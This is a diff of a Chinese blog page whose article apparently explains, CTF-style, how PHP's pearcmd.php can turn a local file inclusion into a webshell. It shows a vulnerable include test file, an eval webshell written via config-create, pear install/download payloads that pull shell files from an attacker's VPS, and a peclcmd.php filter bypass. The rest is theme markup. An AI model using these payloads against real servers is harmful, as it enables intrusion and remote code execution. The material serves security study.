+<span class="token comment"># first find which PHP binary to use</span>
+<span class="token keyword">if</span> <span class="token builtin class-name">test</span> <span class="token string">"x<span class="token variable">$PHP_PEAR_PHP_BIN</span>"</span> <span class="token operator">!=</span> <span class="token string">"x"</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token assign-left variable">PHP</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$PHP_PEAR_PHP_BIN</span>"</span>
+<span class="token keyword">else</span>
+  <span class="token keyword">if</span> <span class="token builtin class-name">test</span> <span class="token string">"/usr/bin/php"</span> <span class="token operator">=</span> <span class="token string">'@'</span>php_bin<span class="token string">'@'</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+    <span class="token assign-left variable">PHP</span><span class="token operator">=</span>php
+  <span class="token keyword">else</span>
+    <span class="token assign-left variable">PHP</span><span class="token operator">=</span><span class="token string">"/usr/bin/php"</span>
+  <span class="token keyword">fi</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment"># then look for the right pear include dir</span>
+<span class="token keyword">if</span> <span class="token builtin class-name">test</span> <span class="token string">"x<span class="token variable">$PHP_PEAR_INSTALL_DIR</span>"</span> <span class="token operator">!=</span> <span class="token string">"x"</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token assign-left variable">INCDIR</span><span class="token operator">=</span><span class="token variable">$PHP_PEAR_INSTALL_DIR</span>
+  <span class="token assign-left variable">INCARG</span><span class="token operator">=</span><span class="token string">"-d include_path=<span class="token variable">$PHP_PEAR_INSTALL_DIR</span>"</span>
+<span class="token keyword">else</span>
+  <span class="token keyword">if</span> <span class="token builtin class-name">test</span> <span class="token string">"/usr/share/php"</span> <span class="token operator">=</span> <span class="token string">'@'</span>php_dir<span class="token string">'@'</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+    <span class="token assign-left variable">INCDIR</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">dirname</span> $0<span class="token variable">`</span></span>
+    <span class="token assign-left variable">INCARG</span><span class="token operator">=</span><span class="token string">""</span>
+  <span class="token keyword">else</span>
+    <span class="token assign-left variable">INCDIR</span><span class="token operator">=</span><span class="token string">"/usr/share/php"</span>
+    <span class="token assign-left variable">INCARG</span><span class="token operator">=</span><span class="token string">"-d include_path=/usr/share/php"</span>
+  <span class="token keyword">fi</span>
+<span class="token keyword">fi</span>
+
+<span class="token builtin class-name">exec</span> <span class="token variable">$PHP</span> <span class="token parameter variable">-C</span> <span class="token parameter variable">-q</span> <span class="token variable">$INCARG</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">date.timezone</span><span class="token operator">=</span>UTC <span class="token parameter variable">-d</span> <span class="token assign-left variable">output_buffering</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">variables_order</span><span class="token operator">=</span>EGPCS <span class="token parameter variable">-d</span> <span class="token assign-left variable">open_basedir</span><span class="token operator">=</span><span class="token string">""</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">safe_mode</span><span class="token operator">=</span><span class="token number">0</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">register_argc_argv</span><span class="token operator">=</span><span class="token string">"On"</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">auto_prepend_file</span><span class="token operator">=</span><span class="token string">""</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">auto_append_file</span><span class="token operator">=</span><span class="token string">""</span> <span class="token variable">$INCDIR</span>/pearcmd.php <span class="token string">"<span class="token variable">$@</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>pear本质上就是个sh文件，上面是文件内容。</p>
 <p><strong>重点就是当执行了pear时，会将$_SERVER[‘argv’]当作参数一起执行，从而自动拉取了指定的php文件</strong></p>
 <h2 id="2-4-利用方法">2.4 利用方法</h2>
@@ -543,59 +611,72 @@
 </blockquote>
 <h1>0x03 漏洞利用</h1>
 <p>下面是测试文件代码</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这其中的file参数就是用来包含pearcmd.php文件的，以便可以将我们的恶意命令接受并执行</p>
 <h2 id="3-1-config-create">3.1 config-create</h2>
 <p>此方法来自于<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神博客</a></p>
 <p>此命令的参数和用法如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">config-create: must have 2 parameters, root path and filename to save as<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">config-create: must have 2 parameters, root path and filename to save as<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
 <p>可以直接往web目录写入webshell，也可以往/tmp/目录写入任意文件名任意内容，然后通过文件包含去包含，在docker环境中pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php（但不同系统的路径可能不同）</p>
 <p>尝试一下使用以下这个命令看下效果</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pear config-create /114514whatever /tmp/test.txt<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231112123753250.png" alt="image-20231112123753250"></p>
+<pre class="line-numbers language-none"><code class="language-none">pear config-create /114514whatever /tmp/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112123753250.png" alt="image-20231112123753250"></p>
 <p>不过这里疑惑为何test.txt文件内容是这样的，在阅读了上述p神的文章发现，这里估计是在执行第一个参数后所产生的结果被序列化存储了（估计是session文件）之后被我们的命令行放入到了test.txt文件中而已。</p>
 <p>那根据上面我们知道第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了</p>
 <p>payload：</p>
-<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/test.php<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231112130017310.png" alt="image-20231112130017310"></p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130017310.png" alt="image-20231112130017310"></p>
 <p>蚁剑连接看看，如下图成功链接</p>
-<p><img src="image-20231112130139760.png" alt="image-20231112130139760"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130139760.png" alt="image-20231112130139760"></p>
 <p>我们来看下写入的文件</p>
-<p><img src="image-20231112130213160.png" alt="image-20231112130213160"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130213160.png" alt="image-20231112130213160"></p>
 <p>可以看见<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;</code>整个被作为参数传入了命令行，但是get参数</p>
 <p>file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入<code>$_SERVER['argv']</code></p>
 <h2 id="3-2-install">3.2 install</h2>
 <p>此方法来自<a target="_blank" rel="noopener" href="https://blog.szfszf.top/article/57/">jrXnm师傅的博客</a></p>
 <p>先来看看install的常规用法：vps上挂了一个php文件</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>然后通过pear下载</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pear install http://[vps]:[port]/flag.php<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pear install http://[vps]:[port]/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>结果：</p>
-<p><img src="image-20231112130636679.png" alt="image-20231112130636679"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130636679.png" alt="image-20231112130636679"></p>
 <p>可以看到成功下载</p>
 <p>结果在<code>/tmp/pear/download/</code>目录下有一个<code>flag.php</code></p>
-<p><img src="image-20231112130729308.png" alt="image-20231112130729308"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130729308.png" alt="image-20231112130729308"></p>
 <p>然后<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p>
-<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/flag.php<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231112131028791.png" alt="image-20231112131028791"></p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/flag.php</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112131028791.png" alt="image-20231112131028791"></p>
 <p>如上图成功包含</p>
 <h2 id="3-3-download">3.3 download</h2>
 <p>先查看一下download的用法</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pear download [option] [package]<br>#这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pear download [option] [package]
+#这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>尝试一下下恶意的php文件</p>
-<p><img src="image-20231112140738636.png" alt="image-20231112140738636"></p>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112140738636.png" alt="image-20231112140738636"></p>
 <p>虽然提示下载错误，但是在当前目录下直接留下了恶意文件。</p>
 <p>我们可以尝试一下利用这个<code>download</code></p>
 <p>我构造的payload为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231112142255239.png" alt="image-20231112142255239"></p>
+<pre class="line-numbers language-none"><code class="language-none">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112142255239.png" alt="image-20231112142255239"></p>
 <p>然后直接访问<code>shell</code>，成功</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231112142330730.png" alt="image-20231112142330730"></p>
+<pre class="line-numbers language-none"><code class="language-none">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112142330730.png" alt="image-20231112142330730"></p>
 <h1>0x04 过滤percmd</h1>
 <p>如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php来代替，在这个php文件当中其实就是引入了pearcmd.php</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-string">'/www/server/php/52/lib/php'</span> != <span class="hljs-string">'@'</span>.<span class="hljs-string">'include_path'</span>.<span class="hljs-string">'@'</span>) {<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'include_path'</span>, <span class="hljs-string">'/www/server/php/52/lib/php'</span>);<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">false</span>;<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">true</span>;<br>}<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'PEAR_RUNTYPE'</span>, <span class="hljs-string">'pecl'</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">'pearcmd.php'</span>;<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/www/server/php/52/lib/php'</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'@'</span><span class="token operator">.</span><span class="token string single-quoted-string">'include_path'</span><span class="token operator">.</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'include_path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/www/server/php/52/lib/php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$raw</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span>
+    <span class="token variable">$raw</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PEAR_RUNTYPE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pecl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'pearcmd.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h1>0x05 参考文章</h1>
 <p><a target="_blank" rel="noopener" href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">关于利用pearcmd进行文件包含的一些总结</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a> – p神！</p>
@@ -690,100 +771,7 @@
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -824,6 +812,275 @@
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -936,9 +1193,12 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -948,7 +1208,6 @@
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -978,19 +1237,6 @@
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1054,89 +1300,42 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1283,6 +1482,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1297,6 +1520,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
